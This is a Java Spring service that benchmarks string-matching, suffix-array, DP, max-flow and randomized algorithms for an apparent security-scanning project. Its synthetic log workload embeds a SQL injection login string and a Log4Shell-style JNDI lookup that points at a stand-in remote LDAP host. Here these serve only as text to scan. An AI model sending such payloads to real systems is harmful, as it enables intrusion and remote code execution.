package com.cybershield.service;

import com.cybershield.algorithms.strings.AhoCorasickAlgorithm;
import com.cybershield.algorithms.strings.KmpAlgorithm;
import com.cybershield.algorithms.strings.RabinKarpAlgorithm;
import com.cybershield.algorithms.strings.ZFunctionAlgorithm;
import com.cybershield.algorithms.suffix.SaisAlgorithm;
import com.cybershield.dto.BenchmarkRequest;
import com.cybershield.dto.BenchmarkResultDto;
import com.cybershield.model.BenchmarkResult;
import com.cybershield.repository.BenchmarkResultRepository;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

@Slf4j
@Service
public class BenchmarkService {

    private final BenchmarkResultRepository benchmarkRepository;

    public BenchmarkService(BenchmarkResultRepository benchmarkRepository) {
        this.benchmarkRepository = benchmarkRepository;
    }

    private final KmpAlgorithm kmp = new KmpAlgorithm();
    private final ZFunctionAlgorithm zFunc = new ZFunctionAlgorithm();
    private final RabinKarpAlgorithm rk = new RabinKarpAlgorithm();
    private final AhoCorasickAlgorithm ac = new AhoCorasickAlgorithm();
    private final SaisAlgorithm sais = new SaisAlgorithm();

    public List<BenchmarkResultDto> runModuleBenchmark(BenchmarkRequest request) {
        String mod = request.getModule() != null ? request.getModule().toUpperCase() : "M1";
        int size = request.getInputSize() != null && request.getInputSize() > 0 ? request.getInputSize() : 10000;
        int trials = request.getIterations() > 0 ? request.getIterations() : 10;
        int warmup = request.getWarmup() != null && request.getWarmup() > 0 ? request.getWarmup() : 5;

        List<String> algos;
        switch (mod) {
            case "M2" -> algos = List.of("suffix-array", "sa-is", "lcp-kasai", "suffix-automaton");
            case "M3" -> algos = List.of("edit-distance-levenshtein", "edit-distance-osa", "matrix-chain", "bitmask-dp");
            case "M4" -> algos = List.of("ford-fulkerson", "edmonds-karp", "dinic");
            case "M6" -> algos = List.of("randomized-quicksort", "miller-rabin", "reservoir-sampling", "parallel-scan");
            default -> algos = List.of("kmp", "z-function", "rabin-karp", "aho-corasick");
        }

        List<BenchmarkResultDto> results = new ArrayList<>();
        for (String algo : algos) {
            BenchmarkRequest singleReq = BenchmarkRequest.builder()
                    .algorithmId(algo)
                    .inputSize(size)
                    .iterations(trials)
                    .warmup(warmup)
                    .text(request.getText())
                    .pattern(request.getPattern())
                    .build();
            results.add(runBenchmark(singleReq));
        }
        return results;
    }

    public BenchmarkResultDto runBenchmark(BenchmarkRequest request) {
        String algoId = (request.getAlgorithmId() != null && !request.getAlgorithmId().isBlank())
                ? request.getAlgorithmId().toLowerCase()
                : "kmp";

        int size = request.getInputSize() != null && request.getInputSize() > 0 ? request.getInputSize() : 10000;
        int trials = request.getIterations() > 0 ? request.getIterations() : 10;
        int warmup = request.getWarmup() != null && request.getWarmup() > 0 ? request.getWarmup() : 5;

        // Generate synthetic security workload payload if not supplied
        String text = (request.getText() != null && !request.getText().isBlank())
                ? request.getText()
                : generateSyntheticPayload(size);
        String pattern = (request.getPattern() != null && !request.getPattern().isBlank())
                ? request.getPattern()
                : "SELECT * FROM users WHERE admin=1";

        // JVM Warmup
        for (int i = 0; i < warmup; i++) {
            runSingle(algoId, text, pattern);
        }

        // Timed Trials
        List<Long> times = new ArrayList<>();
        long lastComps = 0;

        for (int i = 0; i < trials; i++) {
            long t0 = System.nanoTime();
            lastComps = runSingle(algoId, text, pattern);
            long t1 = System.nanoTime();
            times.add(Math.max(1, t1 - t0));
        }

        List<Long> sortedTimes = new ArrayList<>(times);
        Collections.sort(sortedTimes);

        long min = sortedTimes.get(0);
        long max = sortedTimes.get(sortedTimes.size() - 1);
        long median = sortedTimes.get(sortedTimes.size() / 2);

        double mean = times.stream().mapToLong(Long::longValue).average().orElse(0.0);
        double variance = 0.0;
        for (long t : times) {
            variance += Math.pow(t - mean, 2);
        }
        double stdDev = Math.sqrt(variance / times.size());

        try {
            BenchmarkResult entity = BenchmarkResult.builder()
                    .algorithmId(algoId)
                    .inputSize((long) text.length())
                    .executionTimeNanos(median)
                    .comparisonCount(lastComps)
                    .warmupRounds(warmup)
                    .trialRounds(trials)
                    .methodology("JVM Warmup + Repeated NanoTime Median Sampling")
                    .build();
            benchmarkRepository.save(entity);
        } catch (Exception ex) {
            log.warn("Failed to persist benchmark result: {}", ex.getMessage());
        }

        return BenchmarkResultDto.builder()
                .algorithmId(algoId)
                .algorithmName(formatAlgorithmName(algoId))
                .inputSize((long) text.length())
                .warmupRounds(warmup)
                .trialRounds(trials)
                .medianTimeNanos(median)
                .minTimeNanos(min)
                .maxTimeNanos(max)
                .stdDevTimeNanos(stdDev)
                .comparisonCount(lastComps)
                .methodology("JVM Warmup + Repeated NanoTime Median Sampling")
                .trialTimesNanos(times)
                .build();
    }

    private String generateSyntheticPayload(int size) {
        String base = "Oct 13 22:00:01 auth.internal sshd[1234]: Failed password for root from 192.168.1.105 port 54321; " +
                "GET /login?user=admin' OR 1=1-- HTTP/1.1; User-Agent: ${jndi:ldap://203.0.113.42:1389/Exploit}; ";
        StringBuilder sb = new StringBuilder(size);
        while (sb.length() < size) {
            sb.append(base);
        }
        return sb.substring(0, Math.min(size, sb.length()));
    }

    private String formatAlgorithmName(String id) {
        return switch (id.toLowerCase()) {
            case "kmp" -> "KMP (Knuth-Morris-Pratt)";
            case "z-function" -> "Z-Function (Sliding Box)";
            case "rabin-karp" -> "Rabin-Karp Rolling Hash";
            case "aho-corasick" -> "Aho-Corasick Multi-Pattern";
            case "suffix-array" -> "Suffix Array (O(n log² n))";
            case "sa-is" -> "SA-IS Induced Sorting (O(n))";
            case "lcp-kasai" -> "Kasai LCP Inversion (O(n))";
            case "suffix-automaton" -> "Suffix Automaton (DAWG)";
            case "edit-distance-levenshtein" -> "Levenshtein Distance DP";
            case "edit-distance-osa" -> "Damerau-Levenshtein (OSA)";
            case "matrix-chain" -> "Matrix-Chain Multiplication DP";
            case "bitmask-dp" -> "Bitmask DP Security Rules";
            case "ford-fulkerson" -> "Ford-Fulkerson (DFS Flow)";
            case "edmonds-karp" -> "Edmonds-Karp (BFS Flow)";
            case "dinic" -> "Dinic's Blocking Flow";
            case "randomized-quicksort" -> "Randomized QuickSort";
            case "miller-rabin" -> "Miller-Rabin Primality Test";
            case "reservoir-sampling" -> "Reservoir Sampling (Alg R)";
            case "parallel-scan" -> "Blelloch Parallel Scan";
            default -> id.toUpperCase();
        };
    }

    private long runSingle(String algoId, String text, String pattern) {
        String safeText = text != null ? text : "sample";
        String safePattern = (pattern != null && !pattern.isBlank()) ? pattern : "sample";
        return switch (algoId.toLowerCase()) {
            case "kmp" -> kmp.search(safeText, safePattern).getComparisonCount();
            case "z-function" -> zFunc.search(safeText, safePattern).getComparisonCount();
            case "rabin-karp" -> rk.search(safeText, safePattern).getComparisonCount();
            case "aho-corasick" -> ac.search(safeText, List.of(safePattern)).getComparisonCount();
            case "sa-is" -> sais.compute(safeText.length() > 5000 ? safeText.substring(0, 5000) : safeText).getComparisonCount();
            case "suffix-array" -> new com.cybershield.algorithms.suffix.SuffixArrayAlgorithm().buildAndSearch(safeText.length() > 5000 ? safeText.substring(0, 5000) : safeText, "search").getComparisonCount();
            case "lcp-kasai" -> {
                String sub = safeText.length() > 5000 ? safeText.substring(0, 5000) : safeText;
                var saRes = sais.compute(sub);
                yield new com.cybershield.algorithms.suffix.LcpKasaiAlgorithm().compute(sub, saRes.getSuffixArray()).getComparisonCount();
            }
            case "suffix-automaton" -> new com.cybershield.algorithms.suffix.SuffixAutomatonAlgorithm().buildAndQuery(safeText.length() > 5000 ? safeText.substring(0, 5000) : safeText, "query").getComparisonCount();
            case "edit-distance-levenshtein" -> new com.cybershield.algorithms.dp.EditDistanceAlgorithm().compute(safeText.substring(0, Math.min(200, safeText.length())), safePattern.substring(0, Math.min(200, safePattern.length())), "LEVENSHTEIN", 1, 1, 1).getComparisonCount();
            case "edit-distance-osa" -> new com.cybershield.algorithms.dp.EditDistanceAlgorithm().compute(safeText.substring(0, Math.min(200, safeText.length())), safePattern.substring(0, Math.min(200, safePattern.length())), "DAMERAU_OSA", 1, 1, 1).getComparisonCount();
            case "matrix-chain" -> new com.cybershield.algorithms.dp.MatrixChainAlgorithm().compute(new int[]{10, 30, 5, 60, 20, 25}).getComparisonCount();
            case "bitmask-dp" -> new com.cybershield.algorithms.dp.BitmaskDpAlgorithm().solve(
                    4,
                    List.of(
                            com.cybershield.algorithms.dp.BitmaskDpAlgorithm.SecurityRuleInput.builder().ruleId(1).cost(10).coveredPolicies(List.of(0, 1)).build(),
                            com.cybershield.algorithms.dp.BitmaskDpAlgorithm.SecurityRuleInput.builder().ruleId(2).cost(20).coveredPolicies(List.of(1, 2)).build(),
                            com.cybershield.algorithms.dp.BitmaskDpAlgorithm.SecurityRuleInput.builder().ruleId(3).cost(15).coveredPolicies(List.of(2, 3)).build()
                    )
            ).getComparisonCount();
            case "ford-fulkerson" -> {
                com.cybershield.algorithms.graph.FlowGraph fg = new com.cybershield.algorithms.graph.FlowGraph(6);
                fg.addEdge(0, 1, 16); fg.addEdge(0, 2, 13); fg.addEdge(1, 2, 10); fg.addEdge(1, 3, 12);
                fg.addEdge(2, 1, 4); fg.addEdge(2, 4, 14); fg.addEdge(3, 2, 9); fg.addEdge(3, 5, 20);
                fg.addEdge(4, 3, 7); fg.addEdge(4, 5, 4);
                yield new com.cybershield.algorithms.graph.MaxFlowAlgorithm().solve(fg, 0, 5).getComparisonCount();
            }
            case "edmonds-karp" -> {
                com.cybershield.algorithms.graph.FlowGraph fg = new com.cybershield.algorithms.graph.FlowGraph(6);
                fg.addEdge(0, 1, 16); fg.addEdge(0, 2, 13); fg.addEdge(1, 2, 10); fg.addEdge(1, 3, 12);
                fg.addEdge(2, 1, 4); fg.addEdge(2, 4, 14); fg.addEdge(3, 2, 9); fg.addEdge(3, 5, 20);
                fg.addEdge(4, 3, 7); fg.addEdge(4, 5, 4);
                yield new com.cybershield.algorithms.graph.EdmondsKarpAlgorithm().solve(fg, 0, 5).getComparisonCount();
            }
            case "dinic" -> {
                com.cybershield.algorithms.graph.FlowGraph fg = new com.cybershield.algorithms.graph.FlowGraph(6);
                fg.addEdge(0, 1, 16); fg.addEdge(0, 2, 13); fg.addEdge(1, 2, 10); fg.addEdge(1, 3, 12);
                fg.addEdge(2, 1, 4); fg.addEdge(2, 4, 14); fg.addEdge(3, 2, 9); fg.addEdge(3, 5, 20);
                fg.addEdge(4, 3, 7); fg.addEdge(4, 5, 4);
                yield new com.cybershield.algorithms.graph.DinicsAlgorithm().solve(fg, 0, 5).getComparisonCount();
            }
            case "randomized-quicksort" -> {
                List<Integer> nums = new ArrayList<>();
                for (int i = 0; i < Math.min(1000, safeText.length()); i++) nums.add((int) safeText.charAt(i));
                yield new com.cybershield.algorithms.randomized.RandomizedQuickSortAlgorithm().sort(nums, 42L).getTotalComparisons();
            }
            case "miller-rabin" -> new com.cybershield.algorithms.randomized.MillerRabinAlgorithm().testPrimality(10007L, 10, 42L).getComparisonCount();
            case "reservoir-sampling" -> {
                List<Integer> stream = new ArrayList<>();
                for (int i = 0; i < Math.min(5000, safeText.length()); i++) stream.add(i);
                yield new com.cybershield.algorithms.randomized.ReservoirSamplingAlgorithm().sample(stream, 50, 42L).getComparisonCount();
            }
            case "parallel-scan" -> {
                List<Integer> arr = new ArrayList<>();
                for (int i = 0; i < 64; i++) arr.add(i + 1);
                yield new com.cybershield.algorithms.randomized.ParallelScanAlgorithm().scan(arr, "SUM").getComparisonCount();
            }
            default -> kmp.search(safeText, safePattern).getComparisonCount();
        };
    }
}
